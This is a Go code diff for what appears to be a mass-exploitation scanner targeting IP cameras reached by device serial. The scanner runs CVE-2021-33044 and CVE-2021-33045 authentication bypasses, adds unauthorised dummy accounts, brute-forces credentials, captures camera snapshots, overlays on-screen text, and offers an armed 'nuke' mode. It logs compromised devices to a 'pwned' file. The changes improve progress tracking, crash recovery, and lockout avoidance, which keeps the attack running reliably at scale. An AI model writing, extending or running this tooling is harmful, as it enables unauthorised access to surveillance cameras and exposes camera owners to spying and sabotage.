@@ -37,6 +37,12 @@ type Scanner struct {
 	SafeCount      int64
 	WasteCount     int64
 
+	unitSnap   int64
+	unitExtra  int64
+	unitTotal  int64
+	totalUnits int64
+	doneUnits  int64
+
 	// Progress
 	startTime     time.Time
 	lastSample    time.Time
@@ -50,15 +56,9 @@ type Scanner struct {
 	cancelOnce sync.Once
 	pwnedList  []ExploitResult
 	cancelChan chan struct{}
-	hsSem      chan struct{}
 	// ready credentials keyed by serial from serial:login:password input
 	provided map[string]ProvidedCred
 }
-
-const (
-	maxConcurrentHandshakes = 20
-	cleanupWatchdogTimeout  = 10 * time.Minute
-)
 
 func NewScanner(targets []string, config *Config, threads int, outDir string, inputSource string, nukeArmed bool, provided []ProvidedCred) *Scanner {
 	creds := make(map[string]ProvidedCred, len(provided))
@@ -73,7 +73,6 @@ func NewScanner(targets []string, config *Config, threads int, outDir string, in
 		InputSource: inputSource,
 		NukeArmed:   nukeArmed,
 		cancelChan:  make(chan struct{}),
-		hsSem:       make(chan struct{}, maxConcurrentHandshakes),
 		provided:    creds,
 	}
 }
@@ -152,6 +151,18 @@ func (s *Scanner) Run() {
 	}
 	s.TotalCount = total
 
+	s.unitSnap = 0
+	if s.Config.Image.Snapshot {
+		s.unitSnap = 1
+	}
+	s.unitExtra = 0
+	osdPossible := s.Config.Overlay.Osd && (normalizeOSDChannel(s.Config.Overlay.Channel) != "" || len(normalizeOSDLines(s.Config.Overlay.Custom)) > 0)
+	if osdPossible || (s.NukeArmed && s.Config.Nuke.enabled()) {
+		s.unitExtra = 1
+	}
+	s.unitTotal = 1 + s.unitSnap + s.unitExtra
+	s.totalUnits = total * s.unitTotal
+
 	nowStr := time.Now().Format("15:04:05")
 	PrintBanner(nowStr)
 	fmt.Printf("[input] > %s\n", s.InputSource)
@@ -187,12 +198,22 @@ func (s *Scanner) Run() {
 		go func() {
 			defer s.wg.Done()
 			for serial := range onlineChan {
-				select {
-				case <-s.cancelChan:
-					return
-				default:
-				}
-				s.handleOnlineSerial(serial, retries, connTimeout)
+				func() {
+					defer func() {
+						if r := recover(); r != nil {
+							DebugLogf("worker", "online worker panic %v serial %s skipped", r, serial)
+							s.mu.Lock()
+							s.CompletedCount++
+							s.mu.Unlock()
+						}
+					}()
+					select {
+					case <-s.cancelChan:
+						return
+					default:
+					}
+					s.handleOnlineSerial(serial, retries, connTimeout)
+				}()
 			}
 		}()
 	}
@@ -213,6 +234,7 @@ func (s *Scanner) Run() {
 				LogOnlineFound(v.Serial)
 				s.mu.Lock()
 				s.AliveVerdicts++
+				s.doneUnits++
 				s.mu.Unlock()
 				select {
 				case onlineChan <- v.Serial:
@@ -223,6 +245,7 @@ func (s *Scanner) Run() {
 				s.mu.Lock()
 				s.WasteCount++
 				s.CompletedCount++
+				s.doneUnits += s.unitTotal
 				s.mu.Unlock()
 			}
 		}
@@ -317,7 +340,6 @@ func (s *Scanner) handleOnlineSerial(serial string, retries int, connTimeout tim
 		err := client.Handshake()
 		lastErr = err
 		if err == nil {
-			// type0 success. skip type1
 			finalClient = client
 			ok = true
 			break
@@ -330,7 +352,6 @@ func (s *Scanner) handleOnlineSerial(serial string, retries int, connTimeout tim
 		}
 	}
 
-	// all attempts failed, assume type1
 	if !ok && !requiresType1 && lastErr != nil {
 		if strings.Contains(lastErr.Error(), "timeout") || strings.Contains(lastErr.Error(), "no response") {
 			requiresType1 = true
@@ -350,6 +371,7 @@ func (s *Scanner) handleOnlineSerial(serial string, retries int, connTimeout tim
 				s.mu.Lock()
 				s.OnlineCount++
 				s.CompletedCount++
+				s.doneUnits += s.unitTotal - 1
 				s.mu.Unlock()
 				return
 			}
@@ -360,6 +382,10 @@ func (s *Scanner) handleOnlineSerial(serial string, retries int, connTimeout tim
 					type1Delay = val
 				}
 				for idx, cred := range s.Config.Brute.Creds {
+					if until := p2p.DeviceLockedUntil(serial); !until.IsZero() {
+						LogCredsLocked(serial, until)
+						break
+					}
 					if type1Delay > 0 && idx > 0 {
 						select {
 						case <-s.cancelChan:
@@ -401,6 +427,7 @@ func (s *Scanner) handleOnlineSerial(serial string, retries int, connTimeout tim
 		s.mu.Lock()
 		s.WasteCount++
 		s.CompletedCount++
+		s.doneUnits += s.unitTotal - 1
 		s.mu.Unlock()
 	}
 }
@@ -412,7 +439,6 @@ func (s *Scanner) credHint(serial string) (ProvidedCred, bool) {
 	return c, ok
 }
 
-// type1 first then type0 both authenticated with the given login
 func (s *Scanner) handshakeWithCreds(serial string, cred ProvidedCred, retries int, connTimeout time.Duration) *p2p.DHClient {
 	build := func(auth bool) *p2p.DHClient {
 		c := p2p.NewDHClient(serial)
@@ -496,10 +522,30 @@ func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
 	s.mu.Lock()
 	s.SafeCount++
 	s.CompletedCount++
+	s.doneUnits += s.unitTotal - 1
 	s.mu.Unlock()
 }
 
 func (s *Scanner) useProvidedCreds(serial string, client *p2p.DHClient, tunnel *p2p.PTCPTunnel, directOK bool, cred ProvidedCred, cleanup func()) {
+	if until, locked := s.deviceLocked(serial); locked {
+		LogCredsLocked(serial, until)
+		s.mu.Lock()
+		s.SafeCount++
+		s.CompletedCount++
+		s.doneUnits += s.unitTotal - 1
+		s.mu.Unlock()
+		go cleanup()
+		return
+	}
+	if !s.verifyInputCreds(serial, tunnel, cred.Login, cred.Password) {
+		s.mu.Lock()
+		s.SafeCount++
+		s.CompletedCount++
+		s.doneUnits += s.unitTotal - 1
+		s.mu.Unlock()
+		go cleanup()
+		return
+	}
 	ip := ""
 	if addr := client.GetDeviceAddr(); addr != "" {
 		if i := strings.Index(addr, ":"); i > 0 {
@@ -542,6 +588,37 @@ func (s *Scanner) useProvidedCreds(serial string, client *p2p.DHClient, tunnel *
 	}, cleanup)
 }
 
+func (s *Scanner) deviceLocked(serial string) (time.Time, bool) {
+	until := p2p.DeviceLockedUntil(serial)
+	if until.IsZero() {
+		return time.Time{}, false
+	}
+	return until, true
+}
+
+func (s *Scanner) verifyInputCreds(serial string, tunnel *p2p.PTCPTunnel, login, pass string) bool {
+	dhip, err := tunnel.NewDHIPClientOnPort(5000)
+	if err == nil {
+		verr := dhip.LoginNormal(login, pass)
+		dhip.Close()
+		if verr == nil {
+			return true
+		}
+		LogCredsVerify(serial, login, "dhip", verr)
+	}
+	if until, locked := s.deviceLocked(serial); locked {
+		LogCredsLocked(serial, until)
+		return false
+	}
+	sess, serr := newRPC2Session(tunnel, login, pass)
+	if serr == nil && sess != nil {
+		sess.close()
+		return true
+	}
+	LogCredsVerify(serial, login, "rpc2", serr)
+	return false
+}
+
 func (s *Scanner) handlePwnedResult(serial, ip string, res *ExploitResult, tunnel *p2p.PTCPTunnel, reopen func(*ExploitResult) (*p2p.PTCPTunnel, bool), cleanup func()) {
 	activeTunnel, fresh := reopen(res)
 	res.IP = ip
@@ -579,6 +656,7 @@ func (s *Scanner) handlePwnedResult(serial, ip string, res *ExploitResult, tunne
 			if !s.launchSnapshot(serial, res) {
 				s.mu.Lock()
 				s.CompletedCount++
+				s.doneUnits += s.unitSnap
 				s.mu.Unlock()
 			}
 			s.launchExtras(serial, activeTunnel, res, osdCleanup)
@@ -588,6 +666,7 @@ func (s *Scanner) handlePwnedResult(serial, ip string, res *ExploitResult, tunne
 
 	s.mu.Lock()
 	s.CompletedCount++
+	s.doneUnits += s.unitSnap
 	s.mu.Unlock()
 
 	s.launchExtras(serial, activeTunnel, res, osdCleanup)
@@ -647,7 +726,6 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 
 	LogExploitStart(serial, ip)
 
-	// device was already authenticated, collect info and save
 	if client.IsPwnedAuth() {
 		user, pass, _, _ := client.GetDeviceAuth()
 		tunnel.SetAuth(user, pass)
@@ -682,6 +760,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		if !s.launchSnapshot(serial, res) {
 			s.mu.Lock()
 			s.CompletedCount++
+			s.doneUnits += s.unitSnap
 			s.mu.Unlock()
 		}
 		s.launchExtras(serial, tunnel, res, cleanup)
@@ -700,31 +779,31 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		return true
 	}
 
-	// 1. CGI Exploits
+	// CGI Exploits
 	if s.Config.Pwn.Protocol["cgi"] {
 		if s.Config.Pwn.Methods["cve-2021-33044"] {
-			res, err := TryCVE2021_33044(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
+			res, err := TryCVE2021_33044(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password, s.Config.Dummy.Memo)
 			if !finishStage("cve-2021-33044", res, err) {
 				return true
 			}
 		}
 
 		if s.Config.Pwn.Methods["cve-2021-33045"] {
-			res, err := TryCVE2021_33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
+			res, err := TryCVE2021_33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password, s.Config.Dummy.Memo)
 			if !finishStage("cve-2021-33045", res, err) {
 				return true
 			}
 		}
 
 		if s.Config.Pwn.Methods["uau"] {
-			res, err := TryUnauthAddUser(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
+			res, err := TryUnauthAddUser(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password, s.Config.Dummy.Memo)
 			if !finishStage("uau", res, err) {
 				return true
 			}
 		}
 
 		if s.Config.Pwn.Methods["cve-2021-33045"] {
-			if addRes, addErr := TryAddDummy33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password); !finishStage("cve-2021-33045-add", addRes, addErr) {
+			if addRes, addErr := TryAddDummy33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password, s.Config.Dummy.Memo); !finishStage("cve-2021-33045-add", addRes, addErr) {
 				return true
 			}
 		}
@@ -739,7 +818,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 			}
 		}
 	} else if s.Config.Pwn.Protocol["sdk"] && s.Config.Pwn.Methods["brute"] {
-		// 2. SDK Brute (only executed if CGI protocol is disabled)
+		// SDK Brute
 		res, err := TryBruteForceSDK(tunnel, s.Config.Brute.Creds, serial)
 		if err == nil && res != nil {
 			s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor, cleanup)
@@ -754,6 +833,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 	s.mu.Lock()
 	s.SafeCount++
 	s.CompletedCount++
+	s.doneUnits += s.unitTotal - 1
 	s.mu.Unlock()
 	return false
 }
@@ -831,8 +911,19 @@ func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
 		defer func() {
 			s.mu.Lock()
 			s.CompletedCount++
+			s.doneUnits += s.unitSnap
 			s.mu.Unlock()
 		}()
+		defer func() {
+			if r := recover(); r != nil {
+				LogSnapshotResult(serial, "", false, fmt.Errorf("worker panic: %v", r))
+			}
+		}()
+
+		if until := p2p.DeviceLockedUntil(serial); !until.IsZero() {
+			LogSnapshotResult(serial, "", false, fmt.Errorf("account locked until %s", until.Format("15:04:05")))
+			return
+		}
 
 		retries := 3
 		if val, err := getIntValue(s.Config.Scan.Retries); err == nil {
@@ -842,7 +933,14 @@ func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
 
 		time.Sleep(500 * time.Millisecond)
 
+		deadline := time.Now().Add(60 * time.Second)
+		budgetSpent := false
+
 		for attempt := 0; attempt < retries; attempt++ {
+			if time.Now().After(deadline) {
+				budgetSpent = true
+				break
+			}
 			client := p2p.NewDHClient(serial)
 			client.SetRetries(retries)
 			client.SetTimeout(connTimeout)
@@ -889,8 +987,15 @@ func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
 
 			snapshotOK := false
 			for snapshotAttempt := 0; snapshotAttempt < retries; snapshotAttempt++ {
-				if ok, _ := CaptureSnapshot(tunnel, method, login, password, channels, s.OutDir, serial, model, s.Config.Image); ok {
+				if snapshotAttempt > 0 && time.Now().After(deadline) {
+					break
+				}
+				ok, snapErr := CaptureSnapshot(tunnel, method, login, password, channels, s.OutDir, serial, model, s.Config.Image)
+				if ok {
 					snapshotOK = true
+					break
+				}
+				if !snapshotDeadTunnel(snapErr) {
 					break
 				}
 			}
@@ -906,6 +1011,9 @@ func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
 			close(stopHB)
 			client.Close()
 			continue
+		}
+		if budgetSpent {
+			LogSnapshotResult(serial, "", false, fmt.Errorf("snapshot budget spent"))
 		}
 	}()
 	return true
@@ -934,8 +1042,18 @@ func (s *Scanner) launchExtras(serial string, tunnel *p2p.PTCPTunnel, res *Explo
 	s.snapshotWg.Add(1)
 	go func() {
 		defer s.snapshotWg.Done()
+		defer s.addUnits(s.unitExtra)
+		defer func() {
+			if r := recover(); r != nil {
+				DebugLogf("worker", "extras worker panic %v serial %s skipped", r, serial)
+			}
+		}()
 		if cleanup != nil {
 			defer cleanup()
+		}
+		if until := p2p.DeviceLockedUntil(serial); !until.IsZero() {
+			LogOSDResult(serial, 5000, false, fmt.Errorf("account locked until %s", until.Format("15:04:05")))
+			return
 		}
 		if !osdOn {
 			if nukeOn {
@@ -946,7 +1064,7 @@ func (s *Scanner) launchExtras(serial string, tunnel *p2p.PTCPTunnel, res *Explo
 		redial := func() (*p2p.PTCPTunnel, func(), bool) {
 			return s.dialFreshTunnel(serial, res)
 		}
-		err := TryOSD(tunnel, res.Login, res.Password, channel, lines, redial)
+		err := TryOSD(tunnel, res.Login, res.Password, channel, lines, styleFromOverlay(s.Config.Overlay), redial)
 		if err != nil {
 			LogOSDResult(serial, 5000, false, err)
 		} else {
@@ -1022,6 +1140,16 @@ func (s *Scanner) writeXMLFiles(serial string, res *ExploitResult) {
 	}
 }
 
+// units finished from async workers without holding the lock
+func (s *Scanner) addUnits(n int64) {
+	if n <= 0 {
+		return
+	}
+	s.mu.Lock()
+	s.doneUnits += n
+	s.mu.Unlock()
+}
+
 func (s *Scanner) writePwnedStart() {
 	pwnedFile := filepath.Join(s.OutDir, "pwned.csv")
 	needHeader := false
@@ -1042,8 +1170,8 @@ func (s *Scanner) printProgress() {
 	defer s.mu.Unlock()
 
 	var pct float64 = 0.0
-	if s.TotalCount > 0 {
-		pct = (float64(s.CompletedCount) / float64(s.TotalCount)) * 100.0
+	if s.totalUnits > 0 {
+		pct = (float64(s.doneUnits) / float64(s.totalUnits)) * 100.0
 	}
 
 	var pctStr string
